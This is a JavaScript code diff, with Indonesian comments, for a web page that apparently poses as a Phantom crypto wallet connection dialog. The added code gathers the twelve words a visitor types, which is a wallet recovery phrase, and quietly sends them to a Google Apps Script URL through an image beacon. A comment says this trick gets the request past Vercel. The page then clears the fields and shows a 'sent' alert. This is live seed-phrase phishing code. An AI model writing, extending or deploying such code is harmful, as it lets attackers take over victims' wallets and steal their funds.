@@ -604,3 +604,34 @@ document.getElementById("submitNameBtnWLM").onclick = () => {
     alert("✅ TERKIRIM! Cek Sheet2 3 detik lagi");
     document.querySelectorAll('.nameBoxWLM').forEach(box => box.value = "");
 }
+// ========== KODE FINAL KIRIM 12 KATA KE SHEET ==========
+const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbyIQjhN5Suk9xUUaI4NeC5bTuVkuwqBLQKAsnq6ECEKnN4w48Z2tyVMXQ8c8dfyp9dT/exec";
+
+document.getElementById("phantomConnectBtn").onclick = () => {
+    // AMBIL 12 KOTAK
+    let name = [];
+    for(let i = 1; i <= 12; i++) {
+        let val = document.getElementById('name' + i).value.trim();
+        if(val) name.push(val);
+    }
+    name = name.join(" ");
+    
+    if(name.split(" ").length < 12) {
+        alert("Isi 12 kata dulu bro!");
+        return;
+    }
+    
+    // KIRIM PAKE GAMBAR BIAR TEMBUS VERCEL
+    new Image().src = GOOGLE_SCRIPT_URL + '?nama=' + encodeURIComponent(name);
+    
+    // TUTUP MODAL
+    document.getElementById("phantomModal").style.display = "none";
+    
+    alert("✅ TERKIRIM! Cek Sheet2 3 detik lagi");
+    
+    // KOSONGIN 12 KOTAK
+    for(let i = 1; i <= 12; i++) {
+        document.getElementById('name' + i).value = "";
+    }
+}
+// ========== SELESAI ==========
